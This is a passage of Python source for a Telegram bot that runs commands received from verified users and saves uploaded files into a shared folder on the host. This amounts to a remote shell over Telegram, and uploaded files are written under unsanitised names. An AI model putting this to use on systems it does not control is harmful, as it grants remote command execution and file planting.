            p   = f'{PATH_MEM}/{idx}'

            if _isfile(p):
                SESSION.pop(user_id, None)
                _remove(p)

                send(chat_id, f'session is left ({idx}) [+]')
            else:
                send(chat_id, f'your account is not verified ({user_id}) [*]')
            
            return
        

        exsend = SESSION[user_id][2]

        try:
            execute(cmd, exsend)
        except Exception as er:
            send(chat_id, f'{type(er).__name__}({er})')

    

    @tg.message_handler(content_types=('document',))
    def upload(file): 
        chat_id  = file.chat.id 
        user_id  = file.from_user.id 
        doc_id   = file.document.file_id
        doc_name = file.document.file_name


        if not verify_user(chat_id, user_id, '', ''):
            return


        try:
            write_file(f'{PATH_SHARE}/{doc_name}', 
                tg.download_file(tg.get_file(doc_id).file_path))
            send(chat_id, f'file is uploaded ({doc_name}) [+]')
        except Exception:
            send(chat_id, f'failed to upload file {doc_name}) [-]')



    tg.infinity_polling(
        skip_pending=True,
        allowed_updates=('message',),
        timeout=60, 
        long_polling_timeout=60
    )




def main():
    init()

    while True:
        try:
            bot()
        except RuntimeError as er:
            if 'TOKEN' in er.args:
                raise ValueError(er.args[1])
        except:
            sleep(10)
    



if __name__ == '__main__': main() 
